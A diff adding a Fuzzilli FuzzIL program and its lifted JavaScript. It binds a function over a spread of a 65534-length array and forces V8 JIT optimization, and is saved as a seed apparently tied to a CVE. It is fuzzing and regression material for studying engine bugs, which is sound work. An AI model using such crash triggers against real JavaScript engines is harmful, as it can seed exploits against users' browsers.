@@ -1,0 +1,39 @@
+v0 <- LoadInteger '65534'
+v1 <- CreateNamedVariable 'a', 'none'
+SetProperty v1, 'length', v0
+v2 <- BeginPlainFunction -> 
+    v3 <- LoadArguments
+    Return v3
+EndPlainFunction
+v4 <- CallMethodWithSpread v2, 'bind', [...v1]
+v5 <- CreateNamedVariable 'g', 'var', v4
+v6 <- BeginPlainFunction -> 
+    v7 <- LoadInteger '1'
+    v8 <- LoadInteger '2'
+    v9 <- CallFunction v5, [v7, v8]
+    Return v9
+EndPlainFunction
+v10 <- Eval '%PrepareFunctionForOptimization(%@)', [v6]
+v11 <- Eval '%PrepareFunctionForOptimization(%@)', [v2]
+v12 <- CallFunction v6, []
+v13 <- CallFunction v6, []
+v14 <- Eval '%OptimizeFunctionOnNextCall(%@)', [v6]
+v15 <- CallFunction v6, []
+
+
+a.length = 65534;
+function f() {
+    return arguments;
+}
+var g = f.bind(...a);
+function h() {
+    return g(1, 2);
+}
+const v10 = %PrepareFunctionForOptimization(h);
+const v11 = %PrepareFunctionForOptimization(f);
+h();
+h();
+const v14 = %OptimizeFunctionOnNextCall(h);
+h();
+
+FuzzIL program written to /v8/fuzzilli/seed_cve2025_2026/test5.fzil
